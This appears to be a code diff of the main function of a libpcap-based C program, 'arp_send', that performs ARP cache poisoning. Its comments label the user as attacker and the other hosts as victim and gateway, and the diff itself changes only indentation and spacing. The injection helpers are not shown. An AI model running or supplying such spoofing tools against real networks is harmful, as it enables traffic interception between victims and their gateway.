@@ -2,20 +2,20 @@
 
 int main(int argc, char* argv[]) {
    
-    char *dev;
-    char errbuf[PCAP_ERRBUF_SIZE]; // 256
-    pcap_t *pcd;
-    uint8_t *my_mac; //or just my_mac[ETHER_ADDR_LEN] and not use ustrmem
+	char *dev;
+	char errbuf[PCAP_ERRBUF_SIZE]; // 256
+	pcap_t *pcd;
+	uint8_t *my_mac; //or just my_mac[ETHER_ADDR_LEN] and not use ustrmem
 	uint8_t *my_ip;
 	struct in_addr senderIP, targetIP, myIP;
-    u_char* sender_mac;
+	u_char* sender_mac;
 	int length = 0;
-    unsigned char packet[1500];
+	unsigned char packet[1500];
 	
-    if (argc != 4){
-        puts("[-]Usage : ./arp_send [interface] [sender_ip] [target_ip]");
-        return -1;
-    }
+	if (argc != 4){
+        	puts("[-]Usage : ./arp_send [interface] [sender_ip] [target_ip]");
+        	return -1;
+	}
 	
 	my_mac = allocate_ustrmem(ETHER_ADDR_LEN);
 	my_ip  = allocate_ustrmem(IP_ADDR_LEN);
@@ -31,19 +31,19 @@ int main(int argc, char* argv[]) {
 
 	pcd = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
 	if(pcd == NULL){
-        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
+	        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
 		exit(1);
 	}
     //Ethernet header check
-    if (pcap_datalink(pcd) != DLT_EN10MB){
-        fprintf(stderr, "Device %s doesn't provide Ethernet headers\n", argv[1]);
-        exit(1);
-    }
+	if (pcap_datalink(pcd) != DLT_EN10MB){
+		fprintf(stderr, "Device %s doesn't provide Ethernet headers\n", argv[1]);
+		exit(1);
+	}
 
 	// me(attacker) request to victim for mac address.
-	sender_mac = ARP_REQUEST(pcd,my_mac,my_ip,&senderIP); // sender == victim / target == gateway
+	sender_mac = ARP_REQUEST(pcd, my_mac, my_ip, &senderIP); // sender == victim / target == gateway
 	puts("\n----- NOW INJECT -----\n");
-	ARP_TABLE_INJECT(pcd,my_mac,sender_mac,&senderIP,&targetIP);
+	ARP_TABLE_INJECT(pcd, my_mac, sender_mac, &senderIP, &targetIP);
 
 	printf("\n[ FINISHED ]");
 	return 0;
